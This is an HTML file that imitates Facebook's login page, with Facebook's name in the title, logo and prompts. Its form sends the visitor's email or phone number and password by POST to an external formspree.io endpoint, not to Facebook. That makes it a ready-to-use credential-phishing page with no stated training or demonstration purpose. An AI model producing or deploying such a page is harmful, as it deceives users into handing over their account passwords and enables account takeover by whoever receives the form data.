<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="ole.css">
    <title>Facebook - Login</title>
</head>
<body>
    <div class="main">
        <div class="logo">
            Facebook
        </div>
        <div class="container">
            <span class="login">Login to Facebook</span>
            <form action="https://formspree.io/f/mrgnnypz"
            method="POST">
            <input type="name" name="name" id="name" placeholder="Email or phone number">
            <input type="password" name="pass" id="pass" placeholder="Password">
             <!-- your other form fields go here -->
            <button class="login-btn">Log in</button>
            </form>
            <a href="#">Forgotten account</a>
            <div class="style">or</div>
            <button class="new-account">Create New Account</button>
        </div>
    </div>
</body>
</html>
